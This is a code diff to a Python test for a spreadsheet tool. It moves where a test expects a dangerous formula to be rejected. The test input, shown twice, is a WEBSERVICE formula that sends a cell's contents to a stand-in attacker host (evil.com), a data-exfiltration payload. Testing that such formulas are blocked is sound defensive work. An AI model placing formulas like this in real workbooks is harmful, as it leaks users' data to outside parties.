@@ -110,14 +110,13 @@ class TestCellOperations:
     
     def test_dangerous_formula_blocked(self, sample_workbook):
         """Test that dangerous formulas are blocked"""
-        formula_req = FormulaWriteRequest(
-            file_path=str(sample_workbook),
-            sheet_name="TestSheet",
-            cell="A1",
-            formula="=WEBSERVICE('http://evil.com/steal?data='&A1)"
-        )
         with pytest.raises(ValueError, match="blocked"):
-            cell.write_formula(formula_req)
+            FormulaWriteRequest(
+                file_path=str(sample_workbook),
+                sheet_name="TestSheet",
+                cell="A1",
+                formula="=WEBSERVICE('http://evil.com/steal?data='&A1)"
+            )
     
     def test_read_write_range(self, sample_workbook):
         """Test reading and writing ranges"""
